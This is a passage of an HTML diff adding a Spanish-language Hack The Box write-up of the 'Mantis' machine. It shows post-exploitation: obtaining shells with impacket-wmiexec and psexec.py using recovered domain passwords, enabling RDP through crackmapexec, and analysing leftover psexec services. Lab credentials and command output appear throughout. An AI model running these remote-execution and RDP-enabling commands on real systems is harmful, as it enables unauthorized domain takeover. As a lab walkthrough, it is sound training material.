+</span><span class="az">SMB         </span><span class="p">htb.local       445    MANTIS           </span><span class="ve">[+] </span><span class="p">htb.local\Administrator:@dm!n!$tr@t0r </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En este punto hay muchas formas de conectarnos y obtener una shell, podemos usar psexec o directamente <code class="language-plaintext highlighter-rouge">wmiexec</code> y asi obtener una <code class="language-plaintext highlighter-rouge">powershell</code> semi-interactiva</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-wmiexec </span><span class="p">htb.local/Administrator:</span><span class="am">'@dm!n!$tr@t0r'</span><span class="p">@mantis.htb.local -shell-type powershell  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] SMBv2.1 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+PS C:\> </span><span class="am">whoami</span><span class="p">
+htb\administrator
+
+PS C:\></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">O si quisieramos conectarnos por <code class="language-plaintext highlighter-rouge">RDP</code> y asi obtener una interfaz grafica podriamos usar el modulo rdp de <code class="language-plaintext highlighter-rouge">crackmapexec</code> indicando como accion que lo habilite</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb mantis.htb.local -u Administrator -p </span><span class="am">'@dm!n!$tr@t0r'</span><span class="p"> -M rdp -o ACTION=enable
+</span><span class="az">SMB         </span><span class="p">htb.local       445    MANTIS           </span><span class="az">[*] </span><span class="p">Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:MANTIS) (domain:htb.local) (signing:True) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">htb.local       445    MANTIS           </span><span class="ve">[+] </span><span class="p">htb.local\Administrator:@dm!n!$tr@t0r </span><span class="am">(Pwn3d!)
+</span><span class="az">RDP         </span><span class="p">htb.local       445    MANTIS           </span><span class="ve">[+] </span><span class="p">RDP enabled successfully</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Despues de hacerlo podemos ver que el puerto <code class="language-plaintext highlighter-rouge">3389</code> donde corre rdp se habilita</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap</span><span class="p"> -p 3389 mantis.htb.local 
+Nmap scan report for mantis.htb.local
+PORT     STATE SERVICE
+3389/tcp open  ms-wbt-server</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Finalmente podemos conectarnos usando <code class="language-plaintext highlighter-rouge">rdesktop</code> con las credenciales de <code class="language-plaintext highlighter-rouge">Administrator</code> a la maquina y obtener una interfaz grafica interactiva</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ rdesktop</span><span class="p"> -u Administrator -p </span><span class="am">'@dm!n!$tr@t0r'</span><span class="p"> -d htb.local mantis.htb.local  </span>
+</code></pre></div></div><br>
+
+<a href="/htb/mantis/7.png" target="_blank"><div><p><img src="/htb/mantis/7.png"></p></div></a>
+
+</section>
+
+<section class="post" id="altern-administrator">
+<br><h3 class="post-title">Alternativa - Administrator</h3><br>
+
+<p class="plain-text">Curiosamente en versiones algo antiguas de <code class="language-plaintext highlighter-rouge">psexec</code> al autenticarnos como <code class="language-plaintext highlighter-rouge">James</code> este no encuentra recursos compartidos donde puede <code class="language-plaintext highlighter-rouge">escribir</code> ni puede subir un exe, pero por alguna razon nos devuelve uns shell como <code class="language-plaintext highlighter-rouge">nt authority\system</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python2 </span><span class="p">psexec.py htb.local/James:</span><span class="am">'J@m3s_P@ssW0rd!'</span><span class="p">@mantis.htb.local
+Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
+
+[*] Trying protocol 445/SMB...
+
+[*] Requesting shares on mantis.htb.local.....
+[-] share 'ADMIN$' is not writable.
+[-] share 'C$' is not writable.
+[-] share 'NETLOGON' is not writable.
+[-] share 'SYSVOL' is not writable.
+[*] Uploading file kqTZLOso.exe
+[-] Error uploading file kqTZLOso.exe, aborting.....
+[-] Error performing the installation, cleaning up: 'NoneType' object has no attribute 'split'  
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32></span><span class="am">whoami</span><span class="p">
+nt authority\system
+
+C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Desde la interfaz grafica que conseguimos en RDP o con <code class="language-plaintext highlighter-rouge">services</code> de impacket encontramos con 2 servicios de <code class="language-plaintext highlighter-rouge">4</code> letras corriendo sin descripción, son <code class="language-plaintext highlighter-rouge">IHXM</code> y <code class="language-plaintext highlighter-rouge">TZZW</code></p>
+<a href="/htb/mantis/8.png" target="_blank"><div><p><img src="/htb/mantis/8.png"></p></div></a>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-services </span><span class="p">htb.local/Administrator:</span><span class="am">'@dm!n!$tr@t0r'</span><span class="p">@mantis.htb.local list
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Listing services available on target
+..................................................................................................................  
+                          IHXM -                                                                   IHXM -  RUNNING
+..................................................................................................................  
+                          TZZW -                                                                   TZZW -  RUNNING
+..................................................................................................................  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si miramos la configuracion de ambas, estas cargan archivos <code class="language-plaintext highlighter-rouge">exe</code> con nombres raros</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-services </span><span class="p">htb.local/Administrator:</span><span class="am">'@dm!n!$tr@t0r'</span><span class="p">@mantis.htb.local config -name IHXM  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Querying service config for IHXM
+TYPE              : 16 -  SERVICE_WIN32_OWN_PROCESS  
+START_TYPE        :  2 -  AUTO START
+ERROR_CONTROL     :  0 -  IGNORE
+BINARY_PATH_NAME  : C:\Windows\dZEyLGVN.exe
+LOAD_ORDER_GROUP  : 
+TAG               : 0
+DISPLAY_NAME      : IHXM
+DEPENDENCIES      : /
+SERVICE_START_NAME: LocalSystem
+
+</span><span class="ve">❯ impacket-services </span><span class="p">htb.local/Administrator:</span><span class="am">'@dm!n!$tr@t0r'</span><span class="p">@mantis.htb.local config -name TZZW  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Querying service config for TZZW
+TYPE              : 16 -  SERVICE_WIN32_OWN_PROCESS  
+START_TYPE        :  2 -  AUTO START
+ERROR_CONTROL     :  0 -  IGNORE
+BINARY_PATH_NAME  : C:\Windows\EfuIvklz.exe
+LOAD_ORDER_GROUP  : 
+TAG               : 0
+DISPLAY_NAME      : TZZW
+DEPENDENCIES      : /
+SERVICE_START_NAME: LocalSystem</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al revisar la fecha de <code class="language-plaintext highlighter-rouge">creacion</code> de los exe, encontramos que fueron creados en el año <code class="language-plaintext highlighter-rouge">2017</code> probablemente cuando se lanzo la maquina, estos parecen creados por <code class="language-plaintext highlighter-rouge">psexec</code> en la creacion de la maquina y en las pruebas se olvidaron de borrarlos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\> </span><span class="am">dir </span><span class="p">C:\Windows\EfuIvklz.exe
+
+    Directory: C:\Windows
+
+Mode                LastWriteTime     Length Name
+----                -------------     ------ ----
+-a---         8/31/2017   9:29 PM      56320 EfuIvklz.exe  
+
+PS C:\> </span><span class="am">dir </span><span class="p">C:\Windows\dZEyLGVN.exe
+
+    Directory: C:\Windows
+
+Mode                LastWriteTime     Length Name
+----                -------------     ------ ----
+-a---          9/1/2017   1:00 PM      56320 dZEyLGVN.exe  
+
+PS C:\></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Lo mas probable es que psexec al autenticarnos como <code class="language-plaintext highlighter-rouge">james</code> se sincronize con estos <code class="language-plaintext highlighter-rouge">servicios</code> asi que probemos a <code class="language-plaintext highlighter-rouge">detenerlos</code> para ver como se comporta psexec</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-services </span><span class="p">htb.local/Administrator:</span><span class="am">'@dm!n!$tr@t0r'</span><span class="p">@mantis.htb.local stop -name IHXM  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Stopping service IHXM
+
+</span><span class="ve">❯ impacket-services </span><span class="p">htb.local/Administrator:</span><span class="am">'@dm!n!$tr@t0r'</span><span class="p">@mantis.htb.local stop -name TZZW  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Stopping service TZZW</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al correr de nuevo <code class="language-plaintext highlighter-rouge">psexec</code> esta vez no nos devuelve una shell, en resumen esta versión de psexec puede <code class="language-plaintext highlighter-rouge">sincronizarse</code> a un servicio si no se detiene correctamente</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python2 </span><span class="p">psexec.py htb.local/James:</span><span class="am">'J@m3s_P@ssW0rd!'</span><span class="p">@mantis.htb.local
+Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
+
+[*] Trying protocol 445/SMB...
+
+[*] Requesting shares on mantis.htb.local.....
+[-] share 'ADMIN$' is not writable.
+[-] share 'C$' is not writable.
+[-] share 'NETLOGON' is not writable.
+[-] share 'SYSVOL' is not writable.
+[*] Uploading file VEAtvAZK.exe
+[-] Error uploading file VEAtvAZK.exe, aborting.....
+[-] Error performing the installation, cleaning up: 'NoneType' object has no attribute 'split'  
+[*] Opening SVCManager on mantis.htb.local.....
+[-] Error opening SVCManager on mantis.htb.local.....
+[-] Error performing the uninstallation, cleaning up</span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
